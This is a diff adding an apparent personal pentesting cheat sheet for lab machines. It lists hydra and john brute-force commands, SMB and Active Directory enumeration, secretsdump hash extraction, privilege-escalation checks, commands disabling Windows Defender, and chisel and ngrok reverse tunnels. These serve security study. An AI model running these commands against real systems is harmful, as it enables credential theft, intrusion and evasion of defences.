@@ -1,0 +1,267 @@
+COMMON PORTS
+............
+
+80 - HTTP
+443 - HTTPS
+88 - Kerberos
+445 - SMB
+389 - LDAP
+636 - LDAPS
+9389 - ADWS
+25 - SMTP
+22 - SSH
+23 - Telnet
+21 - FTP
+110 - POP3
+143 - IMAP
+8080, 8081 - HTTP Proxy
+137, 138, 139 - NETBIOS
+135 - RPC
+115 - SFTP
+587,465 - Secure SMTP
+3389 - RDP
+3306 - MySQL
+1433 - MS SQL Server
+123 - NTP
+179 - BGP
+69 - TFTP
+102 - MS Exchange
+53 - DNS
+5355 - LLMNR
+5985 - winRM HTTP
+5986 - winRM HTTPS
+
+
+CRACKING PASSWORDS/LOGIN WEB
+.............................
+
+https://hashes.com/en/decrypt/hash
+https://hashcat.net/wiki/doku.php?id=example_hashes
+
+Borrar logs john --> rm ~/.john/john.*
+
+sudo john --format=[format] --wordlist=[path to wordlist] [path to file]
+
+john --list=formats ver cifrados que admite john
+
+Si queremos juntar /etc/passwd y /etc/shadow para luego crackear...
+     unshadow passwd.txt shadow.txt > unshadow.txt
+     john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+hydra -L users.txt -P pass.txt -t 10 <IP address> ssh -s 22
+
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+Replace "ssh" with any service name
+
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Login failed"
+     Ejemplo: hydra -L /home/kali/Downloads/users.txt -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.134.16/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=050toadub7n33f96ehi7jo83o1; security=low; security=low:F=Username and/or password incorrect' 
+              hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
+     Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.188.51 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the username"
+     Ejemplo: hydra -L users.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' --> Panel wordpress que no muestra error y redirecciona
+
+hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get / --> Cuando no es un panel login si no una ventana emergente pidiendo credenciales antes de acceder a la web
+python brut3k1t.py -s smtp -a smtp.gmail.com -u test@gmail.com -w word list.txt -p 25 -d 3 --> Cracking email test@gmail.com con wordlist.txt en el puerto 25 con un retraso de 3 segundos. 
+     more... https://noticiasseguridad.com/hacking-incidentes/realiza-ataques-de-fuerza-bruta-ssh-smtp-facebook-e-instagram-brut3k1t/
+
+RSAcrack -w /opt/techyou.txt -k id_rsa ---> crackear passphrase de archivo id_rsa
+
+crackmapexec smb target.ine.local -u tom -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt --> fuerza bruta SMB
+
+
+SMB
+....
+
+enum4linux -a <IP address>
+smbclient -L IP -N
+
+    Para conectarse:
+        smbclient //IP/RECURSO -n
+    Una vez dentro para descargar archivos:
+        prompt off
+        mget *
+        smbget -R smb://IP/recurso
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [IP]
+smbmap -H [IP]
+smbmap -H [IP] -u [user] -p [password] --> probar usuario y contraseña para ver recursos compartidos
+nmap -p445 --script smb-security-mode [IP] --> nmap script to find the smb protocol security level.
+nmap -p445 --script smb-protocols [IP] --> Identificar versiones de SMB permitidas
+impacket-psexec test.local/user:pass@[IP] --> obtener shell con credenciales conocidas y SMB abierto 
+crackmapexec smb [IP] -u '' -p '' --user --> enumerar usuarios 
+crackmapexec smb [IP] -u [user] -p [passwords] -- probar usarios y contraseñas
+crackmapexec smb ledger.thm -u guest -p '' --shares --> enumerar carpetas compartidas
+crackmapexec smb ledger.thm -u guest -p '' --rid --> enumerar usuarios por rid
+smbshares.sh
+
+
+
+TRATAMIENTO DE IMAGENES
+........................
+
+exiftool imagen.png --> Sacar datos exif de una imagen
+strings imagen.png --> Sacar los strings, texto, datos ocultos de una imagen
+
+
+ACTIVE DIRECTORY
+................
+
+EXT-ENUM
+  crackmapexec smb [rango_IP] --> realizar peticiones smb para descubrir equipos del dominio
+  crackmapexec smb [rango_IP] -u '' -p '' --shares --> intentar enumerar carpetas compartidas en los equipos con un user anonimo
+  crackmapexec smb [rango_IP] -u 'user' -p 'password' --shares --> enumerar carpetas compartidas en los equipos con un user autenticado
+  crackmapexec smb [IP_DC] -u 'user' -p 'password' --groups --> enumerar grupos en los equipos con un user autenticado
+  crackmapexec smb [IP_DC] -u 'user' -p 'password' --users --> enumerar usuarios en los equipos con un user autenticado
+  crackmapexec smb [IP_DC] --pass-pol --> enumerar politica contraseñas del dominio
+  bloodhound-python -u user -p password -d dominio.local -c All --> sacar información del dominio para verla con bloodhound
+  ldapsearch -LLL -x -H ldap://dominio.local -b "" -s base "(objectclass=*)" --> descubrir el DC por medio de ldap
+  ldapsearch -x -H ldap://IP -b "dc=thm,dc=local" --> enumerar usuarios y sus propiedades
+  impacket-secretsdump -just-dc-ntlm dominio.local/user@IP -- mostrar hash de contraseñas de usuarios
+  enum4linux-ng -A IP
+  kerbrute https://github.com/ropnop/kerbrute/releases
+
+INT-ENUM
+  Get-ADUser: Recupera información sobre un usuario específico o sobre todos los usuarios.
+    Ejemplo: Get-ADUser -Identity jdoe
+  Get-ADComputer: Obtiene información sobre una máquina específica o sobre todas las máquinas en el dominio.
+    Ejemplo: Get-ADComputer -Identity PC01
+  Get-ADGroup: Recupera detalles de un grupo en Active Directory.
+    Ejemplo: Get-ADGroup -Identity "Administrators"
+  New-ADUser: Crea un nuevo usuario en Active Directory.
+    Ejemplo: New-ADUser -Name "John Doe"
+  Set-ADUser: Modifica propiedades de un usuario existente.
+    Ejemplo: Set-ADUser -Identity jdoe -Description "Account de prueba"
+  Remove-ADUser: Elimina un usuario de Active Directory.
+    Ejemplo: Remove-ADUser -Identity jdoe
+  Get-ADDomain: Recupera información sobre el dominio.
+    Ejemplo: Get-ADDomain
+  Get-ADForest: Recupera información sobre el bosque de Active Directory.
+    Ejemplo: Get-ADForest
+  Get-ADObject: Recupera un objeto de Active Directory basado en un conjunto de criterios.
+    Ejemplo: Get-ADObject -Filter 'ObjectClass -eq "user"'
+  Get-ADDomainController: Encuentra controladores de dominio en el dominio especificado.
+    Ejemplo: Get-ADDomainController -Discover
+
+  adPEAS.ps1
+  
+https://www.hackplayers.com/2022/03/top10-de-ataques-al-directorio-activo.html
+https://books.spartan-cybersec.com/cpad
+
+
+ENUM PRIVESC
+.............
+
+     Linux
+          sudo -l
+          whoami
+          uname -a
+          ls -la
+          ss -tulwn
+          cat /etc/crontab
+          cat /etc/passwd
+          find / -perm -u=s -type f 2>/dev/null
+          find / -perm -4000 2>/dev/null
+          hostname
+          cat /proc/version
+          history
+          ifconfig
+          netstat
+          pwd
+          env
+          getcap -r / 2>/dev/null
+          systemctl list-timers
+          pspy
+ *Si tras ganar acceso a una shell en la maquina objetivo, somos un usuario con pocos privilegios pero tenemos acceso a /var/www/html podemos buscar mediante el siguiente comando find archivos de configuracion que contengan contraseñas o datos sensibles, para empezar a ganar privilegios: find . -iname '*config*' -type f -exec grep -nie 'pass.*=' --color=always /dev/null {} \;
+
+
+  Windows
+          hostname
+          whoami
+          whoami /groups
+          whoami /priv
+                SeImpersonatePrivilege: As mentioned already, this privilege allows a process to impersonate the security context of another user after authentication. The “potato” attack revolves around abusing this privilege.
+                SeAssignPrimaryTokenPrivilege: This privilege permits a process to assign the primary token of another user to a new process. It is used in conjunction with the SeImpersonatePrivilege privilege.
+                SeBackupPrivilege: This privilege lets users read any file on the system, ignoring file permissions. Consequently, attackers can use it to dump sensitive files like the SAM or SYSTEM hive.
+                SeRestorePrivilege: This privilege grants the ability to write to any file or registry key without adhering to the set file permissions. Hence, it can be abused to overwrite critical system files or registry settings.
+                SeDebugPrivilege: This privilege allows the account to attach a debugger to any process. As a result, the attacker can use this privilege to dump memory from LSASS and extract credentials or even inject malicious code into privileged processes
+          syteminfo
+          ipconfig
+          cmdkey /list
+          icacls
+          schtasks /query
+          schtasks /query /fo LIST /v
+          dir
+          set
+          sc
+          set
+          netstat
+          reg /query
+          sc query windefend
+          sc queryex type=service
+          WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
+          netsh advfirewall firewall dump
+          Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+          REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin  ---> Comprobar si UAC está habilitado
+          *Podemos probar a deshabilitar el escaneo de todos los ficheros descargados y/o adjuntos para subir nuestros ficheros... → "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus" luego → "Set-MpPreference -DisableIOAVProtection $true"
+
+
+PIVOTING
+.........
+
+How to set route
+     ip route add <Network To Which We Need Access> via <GATEWAY>
+         ejemplo:
+             ip route add 192.168.1.0/24 via 10.10.15.1
+
+SSH Local Port Forwarding:
+     ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]
+     ssh -L source_port:forward_to_host:destination_port via_host
+
+SSH Remote Port Forwarding:
+     ssh -R sourcePort:HostToForwardTrafficTo:onPort connectToHost
+     ssh -R PORT:IP:port root@ip
+
+Windows Netsh:
+     netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
+
+Metasploit
+     portfwd add –l 3389 –p 3389 –r target-host
+
+Socat
+     https://github.com/3ndG4me/socat
+     socat TCP4-LISTEN:81 TCP4:IP:PORT
+     socat TCP4-LISTEN:81,fork,reuseaddr TCP4:TCP4:IP
+
+Proxychains (Configurar primero Proxychains socks4 o socks5)
+     /etc/proxychains.conf
+     [ProxyList]
+     socks4 localhost 8080
+     socks5 localhost 1080
+
+Chisel
+     https://github.com/jpillora/chisel
+     Server: chisel server -p 443 -reverse -v --socks5
+     Client: chisel client <server_ip>:443 R:socks
+
+Sshuttle:
+     https://github.com/sshuttle/sshuttle
+     sshuttle -r username@sshserver IP -vv
+     DNS: sshuttle --dns -vvr username@sshserver 0/0
+
+SharpSocks:
+     https://github.com/nettitude/SharpSocks
+
+Pivotnacci:
+     https://github.com/blackarrowsec/pivotnacci
+     pivotnacci https[:]//domain[.]com/agent  --password "s3cr3t"
+     pivotnacci https[:]//domain[.]com/agent  --polling-interval 2000
+
+Metasploit
+     run autoroute -s subnet /24
+     route add subnet subnet_mask session_id 
+     use auxiliary/server/socks_proxy
+
+Para utilizar los túneles y pasar a traves de internet, podemos usar VPS o herramientas como Ngrok.
+https://lnkd.in/dBqFskwM
+./ngrok http 4433
+./ngrok tcp 4433
